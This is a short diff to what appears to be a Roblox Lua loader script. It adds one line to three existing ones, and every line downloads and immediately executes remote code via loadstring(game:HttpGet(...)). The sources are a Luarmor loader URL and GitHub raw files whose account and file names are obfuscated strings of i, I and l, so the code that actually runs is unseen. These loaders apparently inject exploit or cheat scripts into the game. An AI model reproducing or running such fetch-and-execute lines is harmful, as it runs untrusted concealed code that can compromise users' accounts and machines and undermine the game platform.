@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/95211f592ad51ab9c33219aeb6ab54ca.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iiiiiiliilii/lllIiIililliIlIll/refs/heads/main/IIiiiiiilIIIllIlilIIIili"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lliIIIlIiiIl/illlIIilIIliIIlII/refs/heads/main/iiIlIlIiiiiiIIiIill"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/IiIIlilliliil/lIiiilIiliiliillI/refs/heads/main/lIilIlllliIiliIIIliIIl"))()
